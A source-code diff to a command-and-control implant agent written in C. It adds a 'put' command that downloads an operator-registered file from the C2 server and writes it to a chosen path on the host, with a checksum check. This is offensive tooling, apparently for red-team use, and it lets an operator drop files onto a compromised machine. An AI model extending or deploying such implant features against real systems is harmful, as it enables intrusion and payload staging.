@@ -38,6 +38,7 @@
 #if C2_AGENT_ENABLE_BOF
 #include "bof_host.h"
 #endif
+#include "file_transfer.h"
 #if C2_AGENT_ENABLE_BOF || C2_AGENT_ENABLE_RVVM
 #include "module.h"
 #endif
@@ -478,6 +479,43 @@ static void run_download(c2_agent_session *s, c2_memfile *mem, const char *name,
   free(buf);
   obuf_append(out, st == C2_OK ? "downloaded\n" : "download failed\n",
               st == C2_OK ? 11 : 16);
+}
+
+/* `put --file <name> --path <dest> --checksum <sha256>`: fetch an
+ * operator-registered file over the www route and write it to `dest`, verifying
+ * the digest once the transfer completes. This is the same download primitive a
+ * module payload uses, so an operator upload needs no BOF. */
+static void run_put(c2_agent_session *s, c2_memfile *mem,
+                    const c2_str_list *cmd, obuf *out) {
+  char file[512] = "";
+  char dest[512] = "";
+  char checksum[128] = "";
+  c2_cmd_pick_flag(cmd, "--file", file, sizeof(file));
+  c2_cmd_pick_flag(cmd, "--path", dest, sizeof(dest));
+  c2_cmd_pick_flag(cmd, "--checksum", checksum, sizeof(checksum));
+  if (file[0] == '\0' || dest[0] == '\0') {
+    static const char msg[] = "upload failed: missing file or path\n";
+    obuf_append(out, msg, sizeof(msg) - 1);
+    return;
+  }
+
+  char got[65] = {0};
+  char err[192] = {0};
+  c2_status st = c2_agent_put_file(s, mem, file, dest, checksum, got,
+                                   sizeof(got), err, sizeof(err));
+  if (st != C2_OK) {
+    char msg[256];
+    int n = snprintf(msg, sizeof(msg), "upload failed: %s: %s\n", dest,
+                     err[0] != '\0' ? err : c2_status_str(st));
+    if (n > 0)
+      obuf_append(out, msg, (size_t)n);
+    return;
+  }
+
+  char msg[320];
+  int n = snprintf(msg, sizeof(msg), "%s uploaded, sha256sum: %s\n", dest, got);
+  if (n > 0)
+    obuf_append(out, msg, (size_t)n);
 }
 
 #if C2_AGENT_ENABLE_BOF || C2_AGENT_ENABLE_RVVM
@@ -984,6 +1022,8 @@ static void dispatch(const c2_msgtun *m, c2_agent_session *s, c2_memfile *mem,
     run_mem_ls(mem, out);
   } else if (cmd_eq(name, "download")) {
     run_download(s, mem, arg, out);
+  } else if (cmd_eq(name, "put")) {
+    run_put(s, mem, &m->cmd_slice, out);
 #if C2_AGENT_ENABLE_BOF || C2_AGENT_ENABLE_RVVM
   } else if (cmd_eq(name, "custom_module")) {
     run_custom_module(s, mem, &m->cmd_slice, out);
